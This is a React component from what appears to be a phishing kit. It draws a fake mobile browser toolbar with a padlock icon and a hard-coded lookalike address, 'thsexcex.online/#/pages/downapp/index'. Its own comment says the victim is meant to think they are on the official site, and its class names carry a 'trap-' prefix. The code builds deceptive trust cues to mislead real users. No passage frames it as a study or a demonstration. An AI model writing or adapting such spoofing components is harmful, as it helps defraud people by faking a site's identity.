"use client";

import { REAL_SITE_URL } from "@/lib/config";

/** Fake mobile browser bar — victim thinks they are on official site */
export default function MobileBrowserBar() {
  return (
    <div className="trap-browser">
      <div className="trap-browser-toolbar">
        <span className="trap-browser-back">‹</span>
        <div className="trap-browser-urlbox">
          <span className="trap-browser-lock" aria-hidden>
            <svg width="10" height="12" viewBox="0 0 10 12" fill="none">
              <path
                d="M5 0C3.34 0 2 1.34 2 3v1H1a1 1 0 00-1 1v6a1 1 0 001 1h8a1 1 0 001-1V5a1 1 0 00-1-1H8V3c0-1.66-1.34-3-3-3zm1 4H4V3c0-.55.45-1 1-1s1 .45 1 1v1z"
                fill="#5f6368"
              />
            </svg>
          </span>
          <span className="trap-browser-url">thsexcex.online/#/pages/downapp/index</span>
        </div>
        <span className="trap-browser-menu">⋮</span>
      </div>
    </div>
  );
}
